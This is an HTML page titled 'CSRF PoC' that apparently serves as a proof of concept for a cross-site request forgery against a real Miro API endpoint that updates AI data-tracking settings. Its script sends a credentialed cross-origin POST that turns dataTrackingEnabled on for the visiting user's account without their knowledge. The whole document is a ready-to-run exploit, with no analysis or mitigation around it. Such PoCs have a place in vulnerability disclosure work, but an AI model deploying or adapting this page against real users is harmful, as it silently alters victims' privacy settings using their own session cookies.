<!DOCTYPE html>
<html>
  <body>
    <h2>CSRF PoC</h2>
    <form id="csrfForm" method="POST" action="https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812" enctype="text/plain">
      <button type="button" onclick="sendCSRF()">Click to Submit CSRF</button>
    </form>

    <script>
      function sendCSRF() {
        const data = JSON.stringify({ dataTrackingEnabled: true });

        fetch("https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812", {
          method: "POST",
          mode: "cors",
          credentials: "include", // Important to send cookies
          headers: {
            "Content-Type": "application/json"
          },
          body: data
        })
        .then(res => alert("CSRF Request sent!"))
        .catch(err => alert("Failed: " + err));
      }
    </script>
  </body>
</html>
